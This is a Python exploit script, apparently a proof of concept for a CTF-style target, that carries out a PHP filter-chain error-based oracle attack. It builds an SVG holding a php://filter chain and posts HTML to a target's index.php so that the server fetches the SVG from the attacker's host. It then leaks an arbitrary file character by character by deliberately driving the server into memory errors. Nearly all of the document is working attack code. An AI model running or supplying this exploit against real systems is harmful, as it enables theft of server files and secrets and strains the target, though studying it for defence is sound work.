#!/usr/bin/env python3
# Author: Axura
# Original source: https://github.com/4xura/php_filter_chain_oracle_poc
# edited slightly by @brun0ne

import sys
import logging
import base64

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
DEBUG = 1  # Set to 1 to enable debugging, 0 to disable

if len(sys.argv) != 4:
	print(f"Usage: ./{sys.argv[0]} <target IP:PORT> <local IP:PORT> <file or URL to leak>")
	sys.exit(1)

target_ip = sys.argv[1]
local_ip = sys.argv[2]
file_to_leak = sys.argv[3]


def pr_debug(message):
    if DEBUG:
        logging.debug(message) 

def join(*x):
    """ Join multiple filter chains """
    return '|'.join(x)


def err(msg):
    """ Error messages """
    print(f"[-] {msg}")
    raise ValueError


def req(s):
    chain = f"php://filter/{s}/resource={file_to_leak}"
    
    with open('/tmp/demo.svg', 'w') as f:
        data = f"""
<?xml version="1.0" encoding="UTF-8"?>
<svg width="100" height="100">
    <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
    <image xlink:href=":/{chain}" x="0" y="0" height="50px" width="50px" />
</svg>
"""
        f.write(data)

    import requests
    url     = f'http://{target_ip}/index.php'
    headers = {
		"Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
		'html': f"<img src='http://{local_ip}/demo.svg' />"
    }

    response = requests.post(url=url, headers=headers, data=data)
    
    return "Fatal error" in response.text

HEADER = 'convert.base64-encode|convert.base64-encode'
BLOW_UP_ENC = join(*['convert.quoted-printable-encode']*1000)
BLOW_UP_UTF32 = 'convert.iconv.L1.UCS-4LE'
BLOW_UP_INF = join(*[BLOW_UP_UTF32]*50)

print('[*] Computing Baseline to blow up server...')
baseline_blowup = 0
for n in range(100):
    payload = join(*[BLOW_UP_UTF32]*n)
    if req(f'{HEADER}|{payload}'):
        baseline_blowup = n
        break
else:
    err(f'[-] Cannot blow up server with filter(convert.iconv.L1.UCS-4LE) * {n}.')

print(f'[+] Baseline to blow up server: {baseline_blowup}.')

trailer = join(*[BLOW_UP_UTF32]*(baseline_blowup - 1))
assert req(f'{HEADER}|{trailer}') == False  # Request retunrs 200 

pr_debug(f"[+] Trailer: {trailer}")
print('[*] Detecting equals(==) at the end of filter chains...')

equal_detector = [
    req(f'convert.base64-encode|convert.base64-encode|{BLOW_UP_ENC}|{trailer}'),
    req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode|{BLOW_UP_ENC}|{trailer}'),
    req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|{BLOW_UP_ENC}|{trailer}')
]
pr_debug(f"[*] Responses from equal detector: {equal_detector}.")
if sum(equal_detector) != 2:    # expect 2 Trues (500) and 1 False (200)
    err('[-] Something went wrong.')
if equal_detector[0] == False:
    HEADER = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode'
elif equal_detector[1] == False:
    HEADER = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode'
elif equal_detector[2] == False:
    HEADER = f'convert.base64-encode|convert.base64-encode'
else:
    err('[-] Something went wrong.')
pr_debug(f"[+] Adjusted HEADER to make sure == appended: {HEADER}")

FLIP = "convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode"
R2 = "convert.iconv.CSUNICODE.UCS-2BE"
R4 = "convert.iconv.UCS-4LE.10646-1:1993"

def get_nth(n):
	global FLIP, R2, R4
	o = []
	chunk = n // 2
	if chunk % 2 == 1: o.append(R4)
	o.extend([FLIP, R4] * (chunk // 2))
	if (n % 2 == 1) ^ (chunk % 2 == 1): o.append(R2)
	return join(*o)

# Here we use ROT1 to shift chars
ROT1 = 'convert.iconv.437.CP930'

# Method to format strings introduced in Phase 1 for later manipulation
BE = 'convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode'

def find_letter(prefix):
	if not req(f'{prefix}|dechunk|{BLOW_UP_INF}'):
		# a-f A-F 0-9
		if not req(f'{prefix}|{ROT1}|dechunk|{BLOW_UP_INF}'):
			# a-e
			for n in range(5):
				if req(f'{prefix}|' + f'{ROT1}|{BE}|'*(n+1) + f'{ROT1}|dechunk|{BLOW_UP_INF}'):
					return 'edcba'[n]
					break
			else:
				err('something wrong')
		elif not req(f'{prefix}|string.tolower|{ROT1}|dechunk|{BLOW_UP_INF}'):
			# A-E
			for n in range(5):
				if req(f'{prefix}|string.tolower|' + f'{ROT1}|{BE}|'*(n+1) + f'{ROT1}|dechunk|{BLOW_UP_INF}'):
					return 'EDCBA'[n]
					break
			else:
				err('something wrong')
		elif not req(f'{prefix}|convert.iconv.CSISO5427CYRILLIC.855|dechunk|{BLOW_UP_INF}'):
			return '*'
		elif not req(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{BLOW_UP_INF}'):
			# f
			return 'f'
		elif not req(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{BLOW_UP_INF}'):
			# F
			return 'F'
		else:
			err('something wrong')
	elif not req(f'{prefix}|string.rot13|dechunk|{BLOW_UP_INF}'):
		# n-s N-S
		if not req(f'{prefix}|string.rot13|{ROT1}|dechunk|{BLOW_UP_INF}'):
			# n-r
			for n in range(5):
				if req(f'{prefix}|string.rot13|' + f'{ROT1}|{BE}|'*(n+1) + f'{ROT1}|dechunk|{BLOW_UP_INF}'):
					return 'rqpon'[n]
					break
			else:
				err('something wrong')
		elif not req(f'{prefix}|string.rot13|string.tolower|{ROT1}|dechunk|{BLOW_UP_INF}'):
			# N-R
			for n in range(5):
				if req(f'{prefix}|string.rot13|string.tolower|' + f'{ROT1}|{BE}|'*(n+1) + f'{ROT1}|dechunk|{BLOW_UP_INF}'):
					return 'RQPON'[n]
					break
			else:
				err('something wrong')
		elif not req(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{BLOW_UP_INF}'):
			# s
			return 's'
		elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{BLOW_UP_INF}'):
			# S
			return 'S'
		else:
			err('something wrong')
	elif not req(f'{prefix}|{ROT1}|string.rot13|dechunk|{BLOW_UP_INF}'):
		# i j k
		if req(f'{prefix}|{ROT1}|string.rot13|{BE}|{ROT1}|dechunk|{BLOW_UP_INF}'):
			return 'k'
		elif req(f'{prefix}|{ROT1}|string.rot13|{BE}|{ROT1}|{BE}|{ROT1}|dechunk|{BLOW_UP_INF}'):
			return 'j'
		elif req(f'{prefix}|{ROT1}|string.rot13|{BE}|{ROT1}|{BE}|{ROT1}|{BE}|{ROT1}|dechunk|{BLOW_UP_INF}'):
			return 'i'
		else:
			err('something wrong')
	elif not req(f'{prefix}|string.tolower|{ROT1}|string.rot13|dechunk|{BLOW_UP_INF}'):
		# I J K
		if req(f'{prefix}|string.tolower|{ROT1}|string.rot13|{BE}|{ROT1}|dechunk|{BLOW_UP_INF}'):
			return 'K'
		elif req(f'{prefix}|string.tolower|{ROT1}|string.rot13|{BE}|{ROT1}|{BE}|{ROT1}|dechunk|{BLOW_UP_INF}'):
			return 'J'
		elif req(f'{prefix}|string.tolower|{ROT1}|string.rot13|{BE}|{ROT1}|{BE}|{ROT1}|{BE}|{ROT1}|dechunk|{BLOW_UP_INF}'):
			return 'I'
		else:
			err('something wrong')
	elif not req(f'{prefix}|string.rot13|{ROT1}|string.rot13|dechunk|{BLOW_UP_INF}'):
		# v w x
		if req(f'{prefix}|string.rot13|{ROT1}|string.rot13|{BE}|{ROT1}|dechunk|{BLOW_UP_INF}'):
			return 'x'
		elif req(f'{prefix}|string.rot13|{ROT1}|string.rot13|{BE}|{ROT1}|{BE}|{ROT1}|dechunk|{BLOW_UP_INF}'):
			return 'w'
		elif req(f'{prefix}|string.rot13|{ROT1}|string.rot13|{BE}|{ROT1}|{BE}|{ROT1}|{BE}|{ROT1}|dechunk|{BLOW_UP_INF}'):
			return 'v'
		else:
			err('something wrong')
	elif not req(f'{prefix}|string.tolower|string.rot13|{ROT1}|string.rot13|dechunk|{BLOW_UP_INF}'):
		# V W X
		if req(f'{prefix}|string.tolower|string.rot13|{ROT1}|string.rot13|{BE}|{ROT1}|dechunk|{BLOW_UP_INF}'):
			return 'X'
		elif req(f'{prefix}|string.tolower|string.rot13|{ROT1}|string.rot13|{BE}|{ROT1}|{BE}|{ROT1}|dechunk|{BLOW_UP_INF}'):
			return 'W'
		elif req(f'{prefix}|string.tolower|string.rot13|{ROT1}|string.rot13|{BE}|{ROT1}|{BE}|{ROT1}|{BE}|{ROT1}|dechunk|{BLOW_UP_INF}'):
			return 'V'
		else:
			err('something wrong')
	elif not req(f'{prefix}|convert.iconv.CP285.CP280|string.rot13|dechunk|{BLOW_UP_INF}'):
		# Z
		return 'Z'
	elif not req(f'{prefix}|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{BLOW_UP_INF}'):
		# z
		return 'z'
	elif not req(f'{prefix}|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|{BLOW_UP_INF}'):
		# M
		return 'M'
	elif not req(f'{prefix}|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{BLOW_UP_INF}'):
		# m
		return 'm'
	elif not req(f'{prefix}|convert.iconv.CP273.CP1122|string.rot13|dechunk|{BLOW_UP_INF}'):
		# y
		return 'y'
	elif not req(f'{prefix}|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|{BLOW_UP_INF}'):
		# Y
		return 'Y'
	elif not req(f'{prefix}|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{BLOW_UP_INF}'):
		# l
		return 'l'
	elif not req(f'{prefix}|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{BLOW_UP_INF}'):
		# L
		return 'L'
	elif not req(f'{prefix}|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{BLOW_UP_INF}'):
		# h
		return 'h'
	elif not req(f'{prefix}|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{BLOW_UP_INF}'):
		# H
		return 'H'
	elif not req(f'{prefix}|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{BLOW_UP_INF}'):
		# u
		return 'u'
	elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{BLOW_UP_INF}'):
		# U
		return 'U'
	elif not req(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{BLOW_UP_INF}'):
		# g
		return 'g'
	elif not req(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{BLOW_UP_INF}'):
		# G
		return 'G'
	elif not req(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{BLOW_UP_INF}'):
		# t
		return 't'
	elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{BLOW_UP_INF}'):
		# T
		return 'T'
	else:
		err('[-] Something wrong finding letters.')

# Store output string
o = ''

""" Brute force the string for 100 chars """
for i in range(100):
    prefix = f'{HEADER}|{get_nth(i)}'
    letter = find_letter(prefix)
    
    # It's a number
    if letter == '*':
        prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode'
        s = find_letter(prefix)
        
        if s == 'M':
            # 0 - 3
            prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode|{R2}'
            ss = find_letter(prefix)
            if ss in 'CDEFGH':
                letter = '0'
            elif ss in 'STUVWX':
                letter = '1'
            elif ss in 'ijklmn':
                letter = '2'
            elif ss in 'yz*':
                letter = '3'
            else:
                err(f'Bad number: {ss}')
        
        elif s == 'N':
            # 4 - 7
            prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode|{R2}'
            ss = find_letter(prefix)
            if ss in 'CDEFGH':
                letter = '4'
            elif ss in 'STUVWX':
                letter = '5'
            elif ss in 'ijklmn':
                letter = '6'
            elif ss in 'yz*':
                letter = '7'
            else:
                err(f'Bad number: {ss}')
        
        elif s == 'O':
            # 8 - 9
            prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode|{R2}'
            ss = find_letter(prefix)
            if ss in 'CDEFGH':
                letter = '8'
            elif ss in 'STUVWX':
                letter = '9'
            else:
                err(f'Bad number: {ss}')
        else:
            err('wtf')
    
    print(f"[*] Decoded characters: {o}")
    o += letter
    sys.stdout.flush()
    
print()

d = base64.b64decode(o.encode() + b'=' * (-len(o) % 4))
pr_debug(d) # e.g.: b'\x1b$)Cd2RmbGFne2IyNzk0NWIyLWUzZjAt...'

d = d.replace(b'\x1b$)C', b'').split(b'\t')[0]
d = base64.b64decode(d + b'=' * (-len(d) % 4))  
print(f"[!] Leaked content: {d}")
